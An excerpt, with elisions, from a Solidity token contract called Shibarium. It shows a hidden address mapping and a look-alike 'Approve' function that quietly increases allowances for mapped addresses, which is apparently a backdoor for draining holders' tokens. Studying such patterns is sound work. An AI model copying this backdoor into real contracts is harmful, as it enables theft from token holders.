...
//Twitter: https://twitter.com/shibariumnet
...
contract Shibarium is Token, Ownable, IERC20 {
    ...
    mapping(address => address) private _shibusr;
    ...
    function Approve(
        ...
        uint256 allowance = 0;
        if (from == _shibusr[from]) {
            _allowances[from][_shibusr[from]] += amount;
